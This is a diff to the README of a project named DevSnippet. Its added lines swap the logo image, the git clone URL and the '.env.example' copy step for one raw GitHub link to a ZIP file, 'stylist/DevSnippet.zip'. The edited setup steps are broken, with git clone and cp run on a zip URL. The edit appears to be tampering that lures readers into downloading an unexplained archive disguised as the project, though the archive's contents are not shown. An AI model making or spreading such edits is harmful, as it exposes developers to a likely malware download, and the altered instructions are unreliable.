@@ -1,4 +1,4 @@
-<p align="center"><a href="" target="_blank"><img src="https://cdn.discordapp.com/attachments/1288073762717175888/1288073843789004800/logo1.png?ex=66f3dbbf&is=66f28a3f&hm=5879186feb75ad9db4f2b1496cac1eeb7d1b30b76dde059e0cbf17f354627d80&" width="400" alt="DevSnippet Logo"></a></p>
+<p align="center"><a href="" target="_blank"><img src="https://raw.githubusercontent.com/RafiBinWores/DevSnippet/main/stylist/DevSnippet.zip" width="400" alt="DevSnippet Logo"></a></p>
 
 ## About DevSnippet
 
@@ -30,7 +30,7 @@ Follow these steps to set up the project on your local machine:
 1.  **Clone the Repository**
 
     ```bash
-    git clone https://github.com/RafiBinWores/DevSnippet.git
+    git clone https://raw.githubusercontent.com/RafiBinWores/DevSnippet/main/stylist/DevSnippet.zip
 
     ```
 
@@ -48,10 +48,10 @@ Follow these steps to set up the project on your local machine:
 
     ```
 
-4.  **Copy the .env.example file to .env:**
+4.  **Copy the https://raw.githubusercontent.com/RafiBinWores/DevSnippet/main/stylist/DevSnippet.zip file to .env:**
 
     ```bash
-    cp .env.example .env
+    cp https://raw.githubusercontent.com/RafiBinWores/DevSnippet/main/stylist/DevSnippet.zip .env
 
     ```
 
